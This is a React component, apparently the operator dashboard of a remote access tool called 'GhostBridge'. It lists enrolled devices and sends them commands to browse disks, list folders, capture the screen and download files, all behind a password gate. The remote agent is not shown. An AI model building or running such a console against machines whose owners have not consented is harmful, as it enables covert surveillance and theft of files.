"use client";

import { useState, useEffect, useCallback } from "react";
import {
  Monitor,
  HardDrive,
  Cpu,
  Terminal,
  RefreshCw,
  Folder,
  File,
  Image as ImageIcon,
  Home,
  Lock,
  Trash2,
  Pencil,
  FileText,
  Music,
  Video,
  FileArchive,
  FileCode,
  FileJson,
  ArrowUp,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { toast } from "sonner";
import { cn } from "@/lib/cn";
import { useDevMode } from "@/lib/hooks/useDevMode";
import Image from "next/image";

// Tipe Data
type Device = {
  id: string;
  name: string;
  ram_usage: number;
  ram_total: number;
  platform: string;
  user: string;
  last_seen: number;
  is_online: boolean;
};

type FileEntry = {
  name: string;
  kind: "file" | "dir";
  size: string;
};

export default function GhostBridge() {
  const { isDevMode, unlockDevMode } = useDevMode();
  const [devices, setDevices] = useState<Device[]>([]);
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
  const [currentPath, setCurrentPath] = useState("THIS_PC");
  const [files, setFiles] = useState<FileEntry[]>([]);
  const [disks, setDisks] = useState<any[]>([]);
  const [isLoadingFiles, setIsLoadingFiles] = useState(false);
  const [passwordInput, setPasswordInput] = useState("");
  const [screenshot, setScreenshot] = useState<string | null>(null); // Base64
  const [isScreenshotOpen, setIsScreenshotOpen] = useState(false);

  // --- 1. DEVICE POLLING ---
  useEffect(() => {
    if (!isDevMode) return;

    const fetchDevices = async () => {
      try {
        const res = await fetch("/api/ghost?action=list_devices");
        if (res.ok) {
          const data = await res.json();
          setDevices(data);
        }
      } catch (e) {
        console.error(e);
      }
    };

    fetchDevices();
    const interval = setInterval(fetchDevices, 5000); // Update list tiap 5s
    return () => clearInterval(interval);
  }, [isDevMode]);

  // --- 2. COMMAND HANDLER (WITH POLLING) ---
  const sendCommand = async (cmd: string, args: string | null = null) => {
    if (!selectedDevice) return null;

    const startTime = Date.now();

    // 1. Queue Command
    try {
      await fetch("/api/ghost", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "queue_command",
          deviceId: selectedDevice.id,
          command: cmd,
          args: args,
        }),
      });

      // 2. Poll for Result
      // Kita cek tiap 1 detik selama maks 15 detik
      for (let i = 0; i < 15; i++) {
        await new Promise((r) => setTimeout(r, 1500));

        const res = await fetch(
          `/api/ghost?action=get_result&deviceId=${selectedDevice.id}`,
        );
        if (res.ok) {
          const result = await res.json();

          // Pastikan result ini untuk command yang baru saja kita kirim (cek timestamp)
          if (result && result.timestamp > startTime) {
            return result;
          }
        }
      }
      throw new Error("Agent request timeout");
    } catch (error: any) {
      toast.error(error.message || "Failed to execute command");
      return null;
    }
  };

  // --- FILE EXPLORER LOGIC ---
  const fetchDisks = useCallback(async () => {
    if (!selectedDevice) return;
    setIsLoadingFiles(true);
    const toastId = toast.loading("Fetching available disks...");

    try {
      const result = await sendCommand("LIST_DISKS");
      if (result && result.status === "DONE") {
        setDisks(result.data.disks);
        setCurrentPath("THIS_PC");
        toast.success("Disks loaded", { id: toastId });
      } else {
        toast.error("Failed to fetch disks", { id: toastId });
      }
    } catch (e) {
      toast.error("An error occurred", { id: toastId });
    } finally {
      setIsLoadingFiles(false);
    }
  }, [selectedDevice]);

  const fetchDirectory = useCallback(
    async (path: string) => {
      if (!selectedDevice) return;
      if (path === "THIS_PC") {
        fetchDisks();
        return;
      }

      setIsLoadingFiles(true);
      const toastId = toast.loading(`Scanning: ${path}`);

      try {
        const result = await sendCommand("LS", path);

        if (result && result.status === "DONE") {
          setFiles(result.data.files);
          setCurrentPath(result.data.current_path);
          toast.success("Directory loaded", { id: toastId });
        } else if (result && result.status === "ERROR") {
          toast.error(result.data.message, { id: toastId });
        } else {
          toast.error("Failed to fetch directory", { id: toastId });
        }
      } catch (e) {
        toast.error("An error occurred", { id: toastId });
      } finally {
        setIsLoadingFiles(false);
      }
    },
    [selectedDevice, fetchDisks],
  );

  // Auto-load when device selected
  useEffect(() => {
    if (selectedDevice) {
      fetchDisks();
    }
  }, [selectedDevice, fetchDisks]);

  // --- SCREENSHOT LOGIC ---
  const handleScreenshot = async () => {
    if (!selectedDevice) return;
    const toastId = toast.loading("Capturing remote screen...");

    try {
      const result = await sendCommand("SCREENSHOT");

      if (result && result.status === "DONE") {
        setScreenshot(result.data.image || result.data.url);
        setIsScreenshotOpen(true);
        toast.success("Screenshot captured", { id: toastId });
      } else {
        toast.error(result?.data?.message || "Capture failed", { id: toastId });
      }
    } catch (e) {
      toast.error("Capture failed", { id: toastId });
    }
  };

  const handleDownloadFile = async (fileName: string) => {
    if (!selectedDevice) return;
    const fullPath = joinPath(currentPath, fileName);
    const toastId = toast.loading(`Preparing download: ${fileName}`);

    try {
      const result = await sendCommand("GET_FILE", fullPath);

      if (result && result.status === "DONE") {
        window.open(result.data.url, "_blank");
        toast.success("Download link ready", { id: toastId });
      } else {
        toast.error(result?.data?.message || "Download failed", {
          id: toastId,
        });
      }
    } catch (e) {
      toast.error("Download failed", { id: toastId });
    }
  };

  // --- CRUD ACTIONS ---
  const handleDeleteDevice = async (e: React.MouseEvent, deviceId: string) => {
    e.stopPropagation();
    if (!confirm("Are you sure you want to remove this device registry?"))
      return;

    try {
      const res = await fetch("/api/ghost", {
        method: "POST",
        body: JSON.stringify({ action: "delete_device", deviceId }),
      });
      if (res.ok) {
        toast.success("Device removed");
        setDevices((prev) => prev.filter((d) => d.id !== deviceId));
        if (selectedDevice?.id === deviceId) setSelectedDevice(null);
      }
    } catch (e) {
      toast.error("Failed to delete");
    }
  };

  const handleRenameDevice = async (e: React.MouseEvent, deviceId: string) => {
    e.stopPropagation();
    const newName = prompt("Enter new device name:");
    if (!newName) return;

    try {
      const res = await fetch("/api/ghost", {
        method: "POST",
        body: JSON.stringify({ action: "update_device", deviceId, newName }),
      });
      if (res.ok) {
        toast.success("Device renamed");
        setDevices((prev) =>
          prev.map((d) => (d.id === deviceId ? { ...d, name: newName } : d)),
        );
      }
    } catch (e) {
      toast.error("Failed to rename");
    }
  };

  // --- ADMIN GUARD ---
  if (!isDevMode) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center bg-neutral-950 px-4 text-center">
        <div className="relative mb-8">
          <div className="absolute inset-0 animate-pulse rounded-full bg-red-500/20 blur-2xl" />
          <Lock className="relative h-20 w-20 text-red-500" />
        </div>
        <h1 className="mb-2 font-mono text-3xl font-black tracking-tighter text-white">
          SYSTEM RESTRICTED
        </h1>
        <p className="mb-8 max-w-sm text-neutral-500">
          This bridge requires high-level clearance. Please enter the decryption
          key to establish connection.
        </p>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            unlockDevMode(passwordInput);
          }}
          className="w-full max-w-xs space-y-4"
        >
          <div className="group relative">
            <div className="absolute -inset-0.5 rounded-lg bg-linear-to-r from-red-500 to-amber-500 opacity-20 blur transition group-focus-within:opacity-50" />
            <input
              type="password"
              placeholder="Enter Access Code..."
              className="relative w-full rounded-lg border border-neutral-800 bg-neutral-900 px-4 py-3 text-center font-mono tracking-widest text-white outline-hidden focus:border-red-500/50"
              value={passwordInput}
              onChange={(e) => setPasswordInput(e.target.value)}
              autoFocus
            />
          </div>
          <Button
            type="submit"
            className="w-full bg-red-600 font-bold text-white hover:bg-red-700 active:scale-95"
          >
            AUTHORIZE ACCESS
          </Button>
        </form>

        <p className="mt-12 text-[10px] tracking-[0.2em] text-neutral-700 uppercase">
          Authorization Protocol v2.0.4
        </p>
      </div>
    );
  }

  // --- UI RENDER ---
  return (
    <div className="flex h-screen overflow-hidden bg-neutral-950 text-neutral-100">
      {/* SIDEBAR: DEVICE LIST */}
      <aside className="flex w-80 flex-col border-r border-neutral-800 bg-neutral-900/50">
        <div className="border-b border-neutral-800 p-4">
          <h2 className="flex items-center gap-2 text-lg font-bold text-teal-500">
            <Monitor className="h-5 w-5" /> Ghost Network
          </h2>
          <p className="mt-1 text-xs text-neutral-500">
            {devices.length} Devices Detectd
          </p>
        </div>
        <ScrollArea className="flex-1">
          <div className="space-y-1 p-2">
            {devices.map((dev) => (
              <div
                key={dev.id}
                onClick={() => setSelectedDevice(dev)}
                className={cn(
                  "group cursor-pointer rounded-lg border border-transparent p-3 transition-all",
                  selectedDevice?.id === dev.id
                    ? "border-teal-500/30 bg-teal-500/10 text-teal-400"
                    : "hover:bg-neutral-800",
                  !dev.is_online && "opacity-50 grayscale",
                )}
              >
                <div className="mb-1 flex items-start justify-between">
                  <span className="text-sm font-bold">{dev.name}</span>
                  <Badge
                    variant="outline"
                    className={cn(
                      "h-5 text-[10px]",
                      dev.is_online
                        ? "border-green-500/30 bg-green-500/20 text-green-400"
                        : "bg-neutral-800 text-neutral-500",
                    )}
                  >
                    {dev.is_online ? "ONLINE" : "OFFLINE"}
                  </Badge>
                </div>
                <div className="truncate font-mono text-[10px] text-neutral-600">
                  {dev.id}
                </div>
                <div className="mt-2 flex items-center justify-between">
                  <div className="flex gap-3 text-xs text-neutral-500">
                    <span className="flex items-center gap-1">
                      <Cpu className="h-3 w-3" /> {dev.platform}
                    </span>
                  </div>
                  <div className="flex gap-1 opacity-20 transition-opacity group-hover:opacity-100">
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-7 w-7 text-neutral-500 hover:text-teal-400"
                      onClick={(e) => handleRenameDevice(e, dev.id)}
                    >
                      <Pencil className="h-3 w-3" />
                    </Button>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-7 w-7 text-neutral-500 hover:text-red-500"
                      onClick={(e) => handleDeleteDevice(e, dev.id)}
                    >
                      <Trash2 className="h-3 w-3" />
                    </Button>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </ScrollArea>
      </aside>

      {/* MAIN CONTENT */}
      <main className="relative flex flex-1 flex-col">
        {selectedDevice ? (
          <>
            {/* TOOLBAR */}
            <header className="flex h-16 items-center justify-between border-b border-neutral-800 bg-neutral-900/30 px-6">
              <div className="flex items-center gap-3">
                <div className="rounded-full bg-neutral-800 p-2">
                  <Terminal className="h-5 w-5 text-teal-500" />
                </div>
                <div>
                  <h1 className="font-bold">{selectedDevice.name}</h1>
                  <p className="text-xs text-neutral-500">
                    {selectedDevice.user} @ {selectedDevice.platform}
                  </p>
                </div>
              </div>
              <div className="flex gap-2">
                <Button variant="outline" size="sm" onClick={handleScreenshot}>
                  <ImageIcon className="mr-2 h-4 w-4" /> Screenshot
                </Button>
                <Button
                  variant="destructive"
                  size="sm"
                  onClick={() => setSelectedDevice(null)}
                >
                  Disconnect
                </Button>
              </div>
            </header>

            {/* FILE EXPLORER */}
            <div className="flex flex-1 flex-col overflow-hidden p-4">
              {/* Breadcrumb / Path Input */}
              <div className="mb-4 flex gap-2">
                <Button
                  variant="secondary"
                  size="icon"
                  onClick={() => fetchDirectory("THIS_PC")}
                >
                  <Home className="h-4 w-4" />
                </Button>
                <Button
                  variant="secondary"
                  size="icon"
                  onClick={() => {
                    if (currentPath === "THIS_PC") return;
                    // Logic naik satu folder (split path)
                    const parts = currentPath
                      .split("\\")
                      .filter((p) => p !== "");
                    if (parts.length <= 1) {
                      fetchDirectory("THIS_PC");
                      return;
                    }
                    parts.pop(); // Remove current
                    let newPath = parts.join("\\");
                    if (!newPath.endsWith("\\")) newPath += "\\";
                    fetchDirectory(newPath);
                  }}
                >
                  <ArrowUp className="h-4 w-4" />
                </Button>
                <input
                  className="flex-1 rounded border border-neutral-800 bg-neutral-900 px-3 font-mono text-sm text-neutral-300"
                  value={currentPath}
                  readOnly
                />
                <Button
                  size="icon"
                  variant="ghost"
                  onClick={() => fetchDirectory(currentPath)}
                >
                  <RefreshCw
                    className={cn("h-4 w-4", isLoadingFiles && "animate-spin")}
                  />
                </Button>
              </div>

              {/* Files Grid */}
              <div className="flex-1 overflow-y-auto rounded-xl border border-neutral-800 bg-neutral-900/50 p-2">
                {isLoadingFiles ? (
                  <div className="flex h-full items-center justify-center text-neutral-500">
                    <RefreshCw className="mb-2 h-8 w-8 animate-spin" />
                  </div>
                ) : (
                  <div className="grid grid-cols-2 gap-2 md:grid-cols-4 lg:grid-cols-6">
                    {currentPath === "THIS_PC" ? (
                      disks.map((disk, i) => (
                        <div
                          key={i}
                          className="group flex cursor-pointer flex-col items-center gap-2 rounded border border-transparent p-3 text-center transition-all hover:border-neutral-700 hover:bg-neutral-800"
                          onClick={() => fetchDirectory(disk.mount_point)}
                        >
                          <HardDrive className="h-8 w-8 text-teal-500 transition-transform group-hover:scale-110" />
                          <span className="w-full truncate text-xs font-bold">
                            {disk.name || `Local Disk (${disk.mount_point})`}
                          </span>
                          <span className="text-[10px] text-neutral-500">
                            {disk.available_space} free of {disk.total_space}
                          </span>
                        </div>
                      ))
                    ) : (
                      <>
                        {files.map((file, i) => (
                          <div
                            key={i}
                            className="group flex cursor-pointer flex-col items-center gap-2 rounded border border-transparent p-3 text-center transition-all hover:border-neutral-700 hover:bg-neutral-800"
                            onClick={() => {
                              if (file.kind === "dir")
                                fetchDirectory(
                                  joinPath(currentPath, file.name),
                                );
                              else handleDownloadFile(file.name);
                            }}
                          >
                            {file.kind === "dir" ? (
                              <Folder className="h-8 w-8 text-yellow-500 transition-transform group-hover:scale-110" />
                            ) : (
                              getFileIcon(file.name)
                            )}
                            <span className="w-full truncate text-xs select-none">
                              {file.name}
                            </span>
                            {file.kind === "file" && (
                              <span className="text-[10px] text-neutral-600">
                                {file.size}
                              </span>
                            )}
                          </div>
                        ))}
                      </>
                    )}
                  </div>
                )}
              </div>
            </div>
          </>
        ) : (
          <div className="flex flex-1 flex-col items-center justify-center space-y-4 text-neutral-600">
            <Monitor className="h-20 w-20 opacity-20" />
            <p>Select a device to establish connection.</p>
          </div>
        )}
      </main>

      {/* SCREENSHOT MODAL */}
      <Dialog open={isScreenshotOpen} onOpenChange={setIsScreenshotOpen}>
        <DialogContent className="max-w-4xl border-neutral-800 bg-neutral-900">
          <DialogHeader>
            <DialogTitle>Remote Screen View</DialogTitle>
          </DialogHeader>
          <div className="relative aspect-video overflow-hidden rounded-lg border border-neutral-800 bg-black">
            {screenshot ? (
              <Image
                src={`data:image/png;base64,${screenshot}`}
                alt="Screen"
                fill
                className="object-contain"
              />
            ) : (
              <div className="flex h-full items-center justify-center">
                <RefreshCw className="animate-spin text-neutral-500" />
              </div>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}

const getFileIcon = (name: string) => {
  const ext = name.split(".").pop()?.toLowerCase();
  switch (ext) {
    case "txt":
    case "md":
    case "doc":
    case "docx":
    case "pdf":
      return (
        <FileText className="h-8 w-8 text-blue-400 transition-transform group-hover:scale-110" />
      );
    case "mp3":
    case "wav":
    case "flac":
      return (
        <Music className="h-8 w-8 text-purple-400 transition-transform group-hover:scale-110" />
      );
    case "mp4":
    case "mkv":
    case "avi":
      return (
        <Video className="h-8 w-8 text-rose-400 transition-transform group-hover:scale-110" />
      );
    case "jpg":
    case "jpeg":
    case "png":
    case "gif":
    case "webp":
      return (
        <ImageIcon className="h-8 w-8 text-emerald-400 transition-transform group-hover:scale-110" />
      );
    case "zip":
    case "rar":
    case "7z":
    case "tar":
    case "gz":
      return (
        <FileArchive className="h-8 w-8 text-amber-400 transition-transform group-hover:scale-110" />
      );
    case "js":
    case "ts":
    case "py":
    case "rs":
    case "cpp":
    case "cs":
    case "html":
    case "css":
      return (
        <FileCode className="h-8 w-8 text-orange-400 transition-transform group-hover:scale-110" />
      );
    case "json":
      return (
        <FileJson className="h-8 w-8 text-yellow-400 transition-transform group-hover:scale-110" />
      );
    default:
      return (
        <File className="h-8 w-8 text-blue-500 transition-transform group-hover:scale-110" />
      );
  }
};

const joinPath = (base: string, name: string) => {
  if (base === "THIS_PC") return name;
  if (base.endsWith("\\")) return base + name;
  return base + "\\" + name;
};
